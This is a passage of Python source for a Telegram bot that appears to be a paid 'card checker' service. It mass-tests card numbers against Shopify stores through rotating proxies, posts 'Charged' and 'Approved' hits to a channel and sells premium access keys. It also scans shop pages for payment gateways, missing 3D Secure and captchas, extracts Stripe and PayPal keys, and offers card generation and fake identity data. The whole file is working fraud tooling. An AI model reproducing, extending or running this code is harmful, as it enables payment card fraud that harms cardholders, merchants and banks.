            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(2)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                current_sites = sites
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=20)
                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')[:50]
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', 'user')
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', 'user')
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
                else:
                    response_lower = res.get('message', '').lower()
                    if any(key in response_lower for key in ["declined", "generic_error", "generic", "decision_rule_block", "incorrect_number", "brand_not_supported", "payments_credit_card_base_expired"]):
                        all_results['dead'].append(res)  
                    else:
                        if 'errors' not in all_results:
                            all_results['errors'] = []
                        all_results['errors'].append(res)  
                queue.task_done()
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except:
                            pass
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)
        SHOPIFY_SESSION_RESULTS[user_id] = all_results
        await asyncio.sleep(300)
        SHOPIFY_SESSION_RESULTS.pop(user_id, None)


CARD_FORM_PATTERNS = [
    re.compile(r'name\s*=\s*["\'](?:cardnumber|card_number|ccnumber|cc-number|card-num)["\']', re.I),
    re.compile(r'id\s*=\s*["\'](?:cardnumber|card_number|ccnumber|cc-number|card-num)["\']', re.I),
    re.compile(r'placeholder\s*=\s*["\'](?:Card Number|Credit Card|Card No)["\']', re.I),
    re.compile(r'name\s*=\s*["\'](?:cvv|cvv2|cvc|security_code|card_cvc|card-cvc)["\']', re.I),
    re.compile(r'name\s*=\s*["\'](?:expiry|expdate|exp_date|cc-exp|exp-month|exp-year)["\']', re.I),
    re.compile(r'name\s*=\s*["\'](?:billing|payment_method_nonce|credit_card)["\']', re.I),
    re.compile(r'data-(?:stripe|braintree|square|card)[\w-]*=\s*["\']', re.I),
    re.compile(r'Stripe\(|braintree\.dropin|sqpaymentform', re.I),
]

def _scripts(html: str) -> list[str]:
    return re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)

def _in(text: str, *patterns: str) -> bool:
    t = text.lower()
    for p in patterns:
        if p.lower() in t:
            return True
    return False

def has_card_form(html: str) -> bool:
    for p in CARD_FORM_PATTERNS:
        if p.search(html):
            return True
    return False

def detect_gateways(html: str) -> list[str]:
    found = []
    srcs = _scripts(html)
    h = html.lower()
    for s in srcs:
        if "js.stripe.com" in s.lower():
            found.append("Stripe")
            break
    if not found and (re.search(r'pk_live_|pk_test_', html) or "stripe.com" in h):
        found.append("Stripe")
    for s in srcs:
        if "paypal.com/sdk" in s.lower() or "paypalobjects.com" in s.lower():
            found.append("PayPal")
            break
    if not found and ("paypal.com" in h or "data-paypal-button" in h):
        found.append("PayPal")
    for s in srcs:
        if "myshopify.com" in s.lower() or "cdn.shopify.com" in s.lower():
            found.append("Shopify")
            break
    if not found and ("shopify.com" in h or "shopify_pay" in h):
        found.append("Shopify")
    for s in srcs:
        if "braintreegateway.com" in s.lower() or "braintree.js" in s.lower():
            found.append("Braintree")
            break
    if not found and "braintree.dropin" in h:
        found.append("Braintree")
    if "wp-content/plugins/woocommerce" in h or "woocommerce" in h:
        found.append("WooCommerce")
    for s in srcs:
        if "authorize.net" in s.lower() or "accept.js" in s.lower():
            found.append("Authorize.net")
            break
    for s in srcs:
        if "square.com/checkout" in s.lower() or "squarecdn.com" in s.lower():
            found.append("Square")
            break
    if not found and "sqpaymentform" in h:
        found.append("Square")
    for s in srcs:
        if "razorpay.com" in s.lower():
            found.append("Razorpay")
            break
    if not found and "razorpay" in h:
        found.append("Razorpay")
    for s in srcs:
        if "adyen.com" in s.lower():
            found.append("Adyen")
            break
    if not found and "adyen." in h:
        found.append("Adyen")
    for s in srcs:
        if "mollie.com" in s.lower():
            found.append("Mollie")
            break
    if not found and "mollie." in h:
        found.append("Mollie")
    if "klarna." in h or "klarna.com" in h:
        found.append("Klarna")
    if "afterpay" in h or "clearpay" in h:
        found.append("Afterpay")
    for s in srcs:
        if "mercadopago.com" in s.lower():
            found.append("Mercado Pago")
            break
    if not found and "mercadopago" in h:
        found.append("Mercado Pago")
    for s in srcs:
        if "pagseguro" in s.lower():
            found.append("PagSeguro")
            break
    if not found and "pagseguro" in h:
        found.append("PagSeguro")
    for s in srcs:
        if "paddle.com" in s.lower() or "paddle." in s.lower():
            found.append("Paddle")
            break
    if not found and "paddle." in h:
        found.append("Paddle")
    return list(dict.fromkeys(found))

def detect_cms(html: str) -> list[str]:
    found = []
    h = html.lower()
    if "/wp-content/" in h or "wp-json" in h:
        found.append("WordPress")
    if "woocommerce" in h:
        found.append("WooCommerce")
    if "myshopify.com" in h or "cdn.shopify.com" in h:
        found.append("Shopify")
    if "static/version" in h or "magento" in h:
        found.append("Magento")
    if "joomla" in h:
        found.append("Joomla")
    if "drupal.js" in h or "drupal.org" in h:
        found.append("Drupal")
    if "prestashop" in h:
        found.append("PrestaShop")
    if "bigcommerce.com" in h:
        found.append("BigCommerce")
    if "wixstatic.com" in h:
        found.append("Wix")
    if "squarespace.com" in h:
        found.append("Squarespace")
    if "webflow" in h:
        found.append("Webflow")
    if "weebly.com" in h:
        found.append("Weebly")
    return list(dict.fromkeys(found)) if found else ["Unknown"]

def detect_captcha(html: str) -> str | None:
    h = html.lower()
    if "recaptcha" in h or "g-recaptcha" in h:
        return "reCAPTCHA"
    if "hcaptcha" in h:
        return "hCaptcha"
    if "turnstile" in h or "cf-turnstile" in h:
        return "Cloudflare Turnstile"
    return None

def detect_cloudflare(headers, html: str) -> str | None:
    h = html.lower()
    if "__cfduid" in h or "cf-browser-verification" in h:
        return "Cloudflare"
    return None

def detect_cdn(html: str, headers) -> str | None:
    h = html.lower()
    if "cloudflare" in h:
        return "Cloudflare"
    if "fastly" in h:
        return "Fastly"
    if "akamai" in h:
        return "Akamai"
    if "cloudfront" in h:
        return "AWS CloudFront"
    return None

def detect_3d_secure(html: str) -> str:
    h = html.lower()
    if any(x in h for x in ["3d_secure", "3dsecure", "requires_action", "cardinalcommerce", "cavv"]):
        return "3D Secure Found ✅"
    return "2D (No 3D Secure Found ❌)"

def detect_graphql(html: str) -> str:
    h = html.lower()
    if "/graphql" in h or "graphql" in h:
        return "GraphQL Found ✅"
    return "No GraphQL Found ❌"

def extract_gateway_keys(html: str) -> dict[str, list[str]]:
    result = {}
    stripe_keys = re.findall(r'pk_(?:live|test)_[A-Za-z0-9_-]{10,}', html)
    if stripe_keys:
        result["Stripe"] = list(dict.fromkeys(stripe_keys))
    paypal_keys = re.findall(r'client-id[=:][\'"]?([A-Za-z0-9_-]{30,})', html, re.IGNORECASE)
    if paypal_keys:
        result["PayPal"] = list(dict.fromkeys(paypal_keys))
    return result

def detect_analytics(html: str, srcs: list[str]) -> list[str]:
    found = []
    h = html.lower()
    for s in srcs:
        if "google-analytics.com" in s.lower() or "googletagmanager.com" in s.lower():
            if "Google Analytics" not in found:
                found.append("Google Analytics")
        elif "connect.facebook.net" in s.lower():
            if "Facebook Pixel" not in found:
                found.append("Facebook Pixel")
        elif "hotjar.com" in s.lower():
            if "Hotjar" not in found:
                found.append("Hotjar")
    if not found:
        if "gtag" in h or "ga(" in h:
            found.append("Google Analytics")
        if "fbq(" in h:
            found.append("Facebook Pixel")
    return found


@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
    
    sites_data = await load_sites_with_price()
    total_sites = len(sites_data)
    
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    
    welcome_text = f"""━━━━━━━━━━━━━━━━━━
▸ 👋 Hᴇʏ  · @{username}
▸ ᴘʟɴ  · {plan}
▸ Sʜᴏᴘɪғʏ
━━━━━━━━━━━━━━━━━
<code>/cc</code> · <code>/chk</code> · <code>/redeem</code>
━━━━━━━━━━━━━━━━━
One day I will be the best 
💡 Bᴏᴛ Dᴇᴠ Poriot_ke
 Vᴇʀsɪᴏɴ -»3.0 🚀
━━━━━━━━━━━━━━━━━"""
    
    buttons = get_main_menu_keyboard(user_id)
    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 Usᴇʀ Cᴏᴍᴍᴀɴᴅs

🛒 Sʜᴏᴘɪғʏ
├─ <code>/cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
└─ <code>/chk</code> → Mᴀss ᴄʜᴇᴄᴋ ғʀᴏᴍ .ᴛxᴛ ғɪʟᴇ


🔑 Kᴇʏ Sʏsᴛᴇᴍ
└─ <code>/redeem Kᴇʏ</code> → Rᴇᴅᴇᴇᴍ ᴀ pʀᴇᴍɪᴜᴍ ᴋᴇʏ """
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]]
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ.", alert=True)
        return
    admin_text = """👑 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ</b>

📋 <b>Pʀᴇᴍɪᴜᴍ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addpremium ᴜsᴇʀ_ɪᴅ</code> → Aᴅᴅ ᴜsᴇʀ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/removepremium ᴜsᴇʀ_ɪᴅ</code> → Rᴇᴍᴏᴠᴇ ᴜsᴇʀ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/listpremium</code> → Lɪsᴛ ᴀʟʟ pʀᴇᴍɪᴜᴍ ᴜsᴇʀs
└─ <code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code> → Gᴇɴᴇʀᴀᴛᴇ pʀᴇᴍɪᴜᴍ ᴋᴇʏs

🌐 <b>Sɪᴛᴇs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addsites</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sɪᴛᴇs
├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs
├─ <code>/rm ᴜʀʟ</code> → Rᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪᴄ sɪᴛᴇ
├─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ cᴜʀʀᴇɴᴛ sɪᴛᴇs.ᴛxᴛ
├─ <code>/setfilter shopify_global ᴍɪɴ-ᴍᴀx \"Nᴀᴍᴇ\"</code> → Aᴅᴅ pʀɪᴄᴇ fɪʟᴛᴇʀ
├─ <code>/listfilters</code> → Vɪᴇᴡ ᴀʟʟ fɪʟᴛᴇʀs
└─ <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code> → Rᴇᴍᴏᴠᴇ ᴀ fɪʟᴛᴇʀ

🔌 Pʀᴏxʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ
├─ <code>/proxy</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ pʀᴏxɪᴇs
├─ <code>/addproxy</code> → Aᴅᴅ pʀᴏxɪᴇs
├─ <code>/chkproxy ᴘʀᴏxʏ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ pʀᴏxʏ
├─ <code>/rmproxy ᴘʀᴏxʏ</code> → Rᴇᴍᴏᴠᴇ sɪɴɢʟᴇ pʀᴏxʏ
├─ <code>/rmproxyindex 1,2,3</code> → Rᴇᴍᴏᴠᴇ bʏ iɴᴅᴇx
├─ <code>/clearproxy</code> → Rᴇᴍᴏᴠᴇ aʟʟ pʀᴏxɪᴇs
└─ <code>/getproxy</code> → Gᴇᴛ aʟʟ pʀᴏxɪᴇs

📊 <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs</b>
└─ <code>/stats</code> → Sʜᴏᴡ bᴏᴛ sᴛᴀᴛɪsᴛɪᴄs

🔧 <b>Hɪᴛs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/sethits ᴄʜᴀɴɴᴇʟ_ɪᴅ</code> → Sᴇᴛ hɪᴛs cʜᴀɴɴᴇʟ
└─ <code>/hits</code> → Tᴏɢɢʟᴇ hɪᴛs oɴ/oғғ"""
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]]
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    await start(event)

@bot.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu_callback(event):
    tools_text = """🛠️ <b>Tᴏᴏls Mᴇɴᴜ • Pᴀɢᴇ 1/3</b>

📂 <b>Fɪʟᴇ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/split</code> → Sᴘʟɪᴛ cᴀʀᴅs iɴᴛᴏ pᴀʀᴛs
└─ <code>/merge</code> → Mᴇʀɢᴇ mᴜʟᴛɪᴘʟᴇ fɪʟᴇs"""
    buttons = [[Button.inline("Pᴀɢᴇ 2", b"tools_menu_page2", style="primary", icon=5445350109862720603)]]
    await event.edit(premium_emoji(tools_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"tools_menu_page2"))
async def tools_menu_page2_callback(event):
    tools_text = """🛠️ <b>Tᴏᴏls Mᴇɴᴜ • Pᴀɢᴇ 2/3</b>
🔍 <b>Lᴏᴏᴋᴜᴘ & Gᴇɴᴇʀᴀᴛᴏʀ</b>
├─ <code>/bin</code> → BIN iɴғᴏʀᴍᴀᴛɪᴏɴ
├─ <code>/sk</code> → Sᴛʀɪᴘᴇ Kᴇʏ Cʜᴇᴄᴋ
└─ <code>/gen</code> → Gᴇɴᴇʀᴀᴛᴇ cᴀʀᴅs"""
    buttons = [[Button.inline("Pᴀɢᴇ 1", b"tools_menu", style="primary"), Button.inline("Pᴀɢᴇ 3", b"tools_menu_page3", style="primary")]]
    await event.edit(premium_emoji(tools_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"tools_menu_page3"))
async def tools_menu_page3_callback(event):
    tools_text = """🛠️ <b>Tᴏᴏls Mᴇɴᴜ • Pᴀɢᴇ 3/3</b>
🌐 <b>IP & Dᴀᴛᴀ Tᴏᴏʟs</b>
├─ <code>/ip</code> → IP Lᴏᴏᴋᴜᴘ
├─ <code>/fake</code> → Fᴀᴋᴇ Dᴀᴛᴀ
├─ <code>/scg</code> → Sᴄᴀɴ Sɪᴛᴇ
└─ <code>/iban</code> → IBAN Vᴀʟɪᴅᴀᴛᴏʀ"""
    buttons = [[Button.inline("Pᴀɢᴇ 2", b"tools_menu_page2", style="primary")], [Button.inline("Bᴀᴄᴋ", b"main_menu", style="danger")]]
    await event.edit(premium_emoji(tools_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=rb"price_fltr:(\d+):(\d+)"))
async def price_filter_callback(event):
    match = event.pattern_match
    filter_index = int(match.group(1).decode())
    user_id = int(match.group(2).decode())
    if event.sender_id != user_id:
        return await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ fɪʟᴇ!", alert=True)
    if user_id not in TEMP_FILE_DATA:
        return await event.edit(premium_emoji("❌ Fɪʟᴇ nᴏᴛ fᴏᴜɴᴅ!"), parse_mode='html')
    filters = (await load_price_filters()).get('shopify_global', DEFAULT_FILTERS)
    if filter_index >= len(filters):
        return await event.answer("❌ Iɴᴠᴀʟɪᴅ fɪʟᴛᴇʀ!", alert=True)
    selected_filter = filters[filter_index]
    file_data = TEMP_FILE_DATA.pop(user_id)
    cards = file_data['cards']
    if os.path.exists(file_data['file_path']):
        try: os.remove(file_data['file_path'])
        except: pass
    sites_data = await load_sites_with_price()
    if not sites_data:
        return await event.edit(premium_emoji("❌ Nᴏ sɪᴛᴇs fᴏᴜɴᴅ wɪᴛʜ pʀɪᴄᴇs!"), parse_mode='html')
    sites_to_use = [s['url'] for s in sites_data if selected_filter.get('all', False) or (selected_filter['min'] <= s.get('price', 0) < selected_filter['max'])]
    if not sites_to_use:
        return await event.edit(premium_emoji(f"❌ Nᴏ sɪᴛᴇs fᴏᴜɴᴅ iɴ rᴀɴɢᴇ {selected_filter['name']}!"), parse_mode='html')
    await event.edit(premium_emoji(f"🚀 Sᴛᴀʀᴛɪɴɢ cʜᴇᴄᴋ wɪᴛʜ fɪʟᴛᴇʀ: {selected_filter['name']}\n\n📊 Sɪᴛᴇs: {len(sites_to_use)}\n💳 Cᴀʀᴅs: {len(cards)}"), parse_mode='html')
    await start_mass_check(user_id, cards, sites_to_use, event)

@bot.on(events.CallbackQuery(data=b"cancel_filter"))
async def cancel_filter_callback(event):
    user_id = event.sender_id
    if user_id in TEMP_FILE_DATA:
        file_data = TEMP_FILE_DATA.pop(user_id)
        if os.path.exists(file_data['file_path']):
            try: os.remove(file_data['file_path'])
            except: pass
    await event.edit(premium_emoji("❌ Cᴀɴᴄᴇʟʟᴇᴅ."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        return await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        return await event.reply(premium_emoji("❌ Mɪssɪɴɢ sɪᴛᴇs ᴏʀ pʀᴏxɪᴇs."), parse_mode='html')
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        return await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ CC fᴏʀᴍᴀᴛ."), parse_mode='html')
    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{card}</code>..."), parse_mode='html')
    result = await check_card_with_retry(card, sites, proxies, max_retries=20)
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
    status_header = "💎 CHARGED" if result['status'] == 'Charged' else ("✅ APPROVED" if result['status'] == 'Approved' else "❌ DECLINED")
    final_resp = f"""{status_header}
💳 CC <code>{result['card']}</code>
🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}
🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}
💡 Mᴀᴅᴇ ʙʏ Poriot_ke"""
    if result['status'] in ['Charged', 'Approved']:
        await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', 'Unknown'), result.get('price', '-'))
    await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    if not is_premium(event.sender_id):
        return await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
    await process_file_with_filters(event, event.sender_id)

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    if event.sender_id not in ADMIN_ID: return
    args = event.message.text.split('\n')
    if len(args) < 2:
        return await event.reply(premium_emoji("❌ Usᴀɢᴇ: /addproxy followed by proxies."), parse_mode='html')
    proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for p in proxies_to_add: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ Added {len(proxies_to_add)} proxies successfully!"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    if event.sender_id not in ADMIN_ID: return
    proxies = load_proxies()
    await event.reply(premium_emoji(f"🔌 Total Proxies Loaded: {len(proxies)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
async def check_single_proxy(event):
    if event.sender_id not in ADMIN_ID: return
    proxy = event.message.text.split(' ', 1)[1].strip()
    res = await test_proxy(proxy)
    await event.reply(premium_emoji(f"Proxy status: {res['status']}"))

@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
async def remove_single_proxy(event):
    if event.sender_id not in ADMIN_ID: return
    proxy = event.message.text.split(' ', 1)[1].strip()
    proxies = [p for p in load_proxies() if p != proxy]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in proxies: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ Proxy removed: {proxy}"))

@bot.on(events.NewMessage(pattern=r'/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    if event.sender_id not in ADMIN_ID: return
    indices = [int(i.strip()) - 1 for i in event.message.text.split(' ', 1)[1].split(',')]
    proxies = [p for i, p in enumerate(load_proxies()) if i not in indices]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in proxies: await f.write(f"{p}\n")
    await event.reply(premium_emoji("✅ Proxies removed by index."))

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    if event.sender_id not in ADMIN_ID: return
    async with aiofiles.open(PROXY_FILE, 'w') as f: await f.write("")
    await event.reply(premium_emoji("✅ All proxies cleared."))

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    if event.sender_id not in ADMIN_ID: return
    proxies = load_proxies()
    await event.reply(premium_emoji(f"Proxies ({len(proxies)}):\n" + "\n".join(proxies[:20])))

# --- FIXED BYPASS FOR /site (NO MORE WIPING) ---
@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ sɪᴛᴇs.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Rᴇғʀᴇsʜɪɴɢ {len(sites)} sɪᴛᴇs (Bypassing validation)..."), parse_mode='html')
    try:
        sites_with_price = [{'url': site, 'price': 1.00} for site in sites]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in sites:
                await f.write(f"{site}\n")
        await save_sites_with_price(sites_with_price)
        await status_msg.edit(premium_emoji(f"✅ Sɪᴛᴇ ʀᴇғʀᴇsʜ cᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ Aᴄᴛɪᴠᴇ: {len(sites)}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rm\s+'))
async def remove_site_command(event):
    if event.sender_id not in ADMIN_ID: return
    url = event.message.text.split(' ', 1)[1].strip()
    sites = [s for s in load_sites() if s != url]
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in sites: await f.write(f"{s}\n")
    await event.reply(premium_emoji(f"✅ Site removed: {url}"))

# --- FIXED BYPASS FOR /addsites (NO MORE WIPING) ---
@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 Pʟᴇᴀsᴇ rᴇᴘʟʏ tᴏ a .ᴛxᴛ fɪʟᴇ."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ rᴇᴘʟʏ tᴏ a .ᴛxᴛ fɪʟᴇ."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 Pʀᴏᴄᴇssɪɴɢ sɪᴛᴇs fɪʟᴇ..."), parse_mode='html')
    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            sites = [line.strip() for line in (await f.read()).splitlines() if line.strip()]
        os.remove(file_path)
        if not sites:
            await status_msg.edit(premium_emoji("❌ Nᴏ vᴀʟɪᴅ sɪᴛᴇs fᴏᴜɴᴅ."), parse_mode='html')
            return

        sites_with_price = [{'url': site, 'price': 1.00} for site in sites]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in sites:
                await f.write(f"{site}\n")
        await save_sites_with_price(sites_with_price)

        await status_msg.edit(premium_emoji(f"✅ Sɪᴛᴇs uᴘᴅᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ! (Bypassed Check)\n\nTᴏᴛᴀʟ sɪᴛᴇs: {len(sites)}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply(premium_emoji("📝 Usage: /addpremium user_id"))
    target_id = int(parts[1])
    if await add_premium_user(target_id):
        await event.reply(premium_emoji(f"✅ User {target_id} added to premium!"))
    else:
        await event.reply(premium_emoji(f"⚠️ User {target_id} already premium."))

@bot.on(events.NewMessage(pattern=r'/(removepremium|rmpremium)'))
async def remove_premium_command(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply(premium_emoji("📝 Usage: /removepremium user_id"))
    target_id = int(parts[1])
    if await remove_premium_user(target_id):
        await event.reply(premium_emoji(f"✅ User {target_id} removed from premium."))
    else:
        await event.reply(premium_emoji(f"⚠️ User {target_id} not found."))

@bot.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_command(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 4: return await event.reply(premium_emoji("📝 Usage: /genkeys amount hours limit"))
    amount, hours, user_limit = int(parts[1]), int(parts[2]), int(parts[3])
    keys_data = await load_keys()
    generated = []
    for _ in range(amount):
        k = generate_key()
        keys_data[k] = {'type': 'time_limit', 'hours': hours, 'expiry': (datetime.now() + timedelta(hours=hours)).isoformat(), 'user_limit': user_limit, 'used_count': 0, 'used_by': []}
        generated.append(k)
    await save_keys(keys_data)
    await event.reply(premium_emoji(f"⭐ Keys Generated ({amount}):\n" + "\n".join(generated)))

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply(premium_emoji("📝 Usage: /redeem Key"))
    key = parts[1].upper()
    keys_data = await load_keys()
    if key not in keys_data: return await event.reply(premium_emoji("❌ Invalid Key!"))
    data = keys_data[key]
    if datetime.now() > datetime.fromisoformat(data['expiry']) or data['used_count'] >= data['user_limit'] or str(event.sender_id) in data['used_by']:
        return await event.reply(premium_emoji("❌ Key expired or already used."))
    await add_premium_user(event.sender_id)
    data['used_count'] += 1
    data['used_by'].append(str(event.sender_id))
    await save_keys(keys_data)
    await event.reply(premium_emoji("🎉 Premium Activated Successfully!"))

@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    if event.sender_id not in ADMIN_ID: return
    await event.reply(premium_emoji(f"👑 Premium Users:\n" + "\n".join(load_premium_users())))

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    if event.sender_id not in ADMIN_ID: return
    await event.reply(premium_emoji(f"📊 Stats:\nAdmins: {len(ADMIN_ID)}\nPremium: {len(load_premium_users())}\nSites: {len(load_sites())}\nProxies: {len(load_proxies())}"))

@bot.on(events.NewMessage(pattern='/sethits'))
async def set_hits_channel(event):
    if event.sender_id not in ADMIN_ID: return
    global HITS_CHANNEL_ID
    HITS_CHANNEL_ID = int(event.raw_text.split()[1])
